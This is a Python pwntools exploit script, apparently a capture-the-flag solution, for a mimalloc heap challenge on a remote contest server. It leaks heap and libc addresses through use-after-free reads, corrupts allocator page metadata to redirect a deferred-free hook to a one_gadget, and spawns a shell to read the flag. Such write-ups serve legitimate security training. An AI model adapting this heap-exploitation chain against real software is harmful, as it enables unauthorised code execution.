#!/usr/bin/env python
from pwn import *
import re

# TWCTF{mi_miii_mee_mean_nomeaning}

context.arch = 'amd64'
e , l , l2 = ELF( './mi' ) , ELF( './libc.so.6' ) , ELF( './libmimalloc-81b667936e8a2861c944a83a14aef4c4b7b265adfb0c12fbdfba555aef5b2769.so' )
y = remote( 'mi.chal.ctf.westerns.tokyo' , 10001 )


def add( idx , size ):
    y.sendlineafter( '>>\n' ,  '1' )
    y.sendlineafter( 'ber\n' , str( idx ).ljust( 0x18 , '\0' ) )
    y.sendlineafter( 'size\n' , str( size ).ljust( 0x18 , '\0' ) )


def wri( idx , data ):
    y.sendlineafter( '>>\n' ,  '2' )
    y.sendlineafter( 'ber\n' , str( idx ) )
    y.sendafter( 'alue\n' , data )

def read( idx ):
    y.sendlineafter( '>>\n' ,  '3' )
    y.sendlineafter( 'ber\n' , str( idx ) )

def dle( idx ):
    y.sendlineafter( '>>\n' ,  '4' )
    y.sendlineafter( 'ber\n' , str( idx ) )


add( 0 , 0x38 )
add( 1 , 0x38 )
dle(0)
dle(1)
read(1)
heap = u64(y.recv(6).ljust(8,"\0")) - 0x1680
success( 'heap -> %s' % hex( heap ) )

add( 0 , 0x38 )
dle(0)
for i in xrange( 0x3d ):
    add( 2 , 0x38 )

wri( 0 , p64( heap + 0x70 ) + p64(0) * 6 )
add( 2 , 0x38 )
add( 2 , 0x38 )
read(2)
y.recv(0x38)

l.address = u64(y.recv(6).ljust(8,"\x00")) + 0x6c40
success( 'libc -> %s' % hex( l.address ) )
l2.address = l.address - 0x22a000
success( 'libmimalloc -> %s' % hex( l2.address ) )

wri( 2 , p64( heap + 0xb0 ) + p64(0) * 6 )
add( 3 , 0x38 )
wri( 3, p64(0) * 2 + p64( 0x401 ) + p64(0) * 4 )
wri( 2, p64( heap + 0xc8 ) + p64(0) * 6 )

add( 5 , 0x100 )
for i in range( 15 ):
    add( 6 , 0x100 )


add( 4 , 0x38 )


one = 0x4f322
deferred_free = l2.address + 0x228970

p = flat(
    0, # page->free 
    0,
    0x10,
    l.address + one, 0, # page->local_free , 0
    heap + 0x10000 , 0x100 # page->thread_free, 0
)
wri( 4 , p )

wri( 5 , p64(heap + 0x10f00) + p64(0) * ( 0x100 / 8 - 1 ) )
wri( 6 , p64(deferred_free) + p64(0) * ( 0x100 / 8  - 1 ) )

add( 0 , 0x100 )
add( 0 , 0 )

y.sendline( 'cat /home/*/flag' )

y.interactive()
